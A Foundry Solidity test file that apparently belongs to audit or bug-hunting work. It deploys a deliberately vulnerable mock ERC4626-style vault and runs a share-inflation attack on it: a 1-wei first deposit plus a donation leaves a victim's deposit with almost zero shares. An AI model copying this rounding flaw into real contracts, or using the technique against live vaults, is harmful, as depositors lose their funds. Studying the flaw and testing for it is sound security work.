// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "forge-std/console.sol";

contract MockERC20 {
    mapping(address=>uint256) public balanceOf;
    mapping(address=>mapping(address=>uint256)) public allowance;
    function approve(address s, uint256 a) external returns(bool){ allowance[msg.sender][s]=a; return true; }
    function transfer(address to, uint256 a) external returns(bool){ balanceOf[msg.sender]-=a; balanceOf[to]+=a; return true; }
    function transferFrom(address f, address t, uint256 a) external returns(bool){
        if(allowance[f][msg.sender]!=type(uint256).max) allowance[f][msg.sender]-=a;
        balanceOf[f]-=a; balanceOf[t]+=a; return true;
    }
    function mint(address to, uint256 a) external { balanceOf[to]+=a; }
}

contract MockVaultVULNERABLE {
    MockERC20 public asset;
    uint256 public totalSupply;
    uint256 public totalAssets;
    mapping(address=>uint256) public balanceOf;
    constructor(address _a){asset=MockERC20(_a);}
    // VULNERAVEL: arredonda pra baixo, sem virtual shares
    function previewDeposit(uint256 assets) public view returns(uint256){
        if(totalSupply==0) return assets;
        return assets * totalSupply / totalAssets;
    }
    function deposit(uint256 assets, address receiver) external returns(uint256){
        uint256 shares = previewDeposit(assets);
        asset.transferFrom(msg.sender, address(this), assets);
        totalSupply+=shares; totalAssets+=assets; balanceOf[receiver]+=shares; return shares;
    }
    function redeem(uint256 s, address, address o) external returns(uint256){
        uint256 a = s * totalAssets / totalSupply;
        balanceOf[o]-=s; totalSupply-=s; totalAssets-=a; return a;
    }
    // Função pra simular doação que infla o vault
    function doInflationAttack(uint256 donation) external {
        totalAssets += donation;
    }
}

contract DivinoScannerPrecisionV3 is Test {
    MockERC20 underlying;
    MockVaultVULNERABLE vault;
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        underlying = new MockERC20();
        vault = new MockVaultVULNERABLE(address(underlying));
    }

    function testV3_PrecisionLoss_TwyneStyle() public {
        underlying.mint(attacker, 11 ether);
        underlying.mint(victim, 10000);

        vm.startPrank(attacker);
        underlying.approve(address(vault), type(uint256).max);
        vault.deposit(1, attacker); // 1 wei inicial
        vault.doInflationAttack(10 ether); // doa 10 ether direto
        vm.stopPrank();

        vm.startPrank(victim);
        underlying.approve(address(vault), type(uint256).max);
        uint256 preview = vault.previewDeposit(10000);
        uint256 shares = vault.deposit(10000, victim);

        console.log("=== DIVINO SCANNER V3 - ATAQUE REAL ===");
        console.log("Victim deposit: 10000");
        console.log("Preview shares:", preview);
        console.log("Real shares:", shares);

        if(shares==0) console.log("[CRITICAL] 0 shares - ROUBO TOTAL!");
        else if(shares < 5) console.log("[CRITICAL FOUND] Quase 0 shares - BUG TWYNE #93420!");

        vm.stopPrank();
    }
}
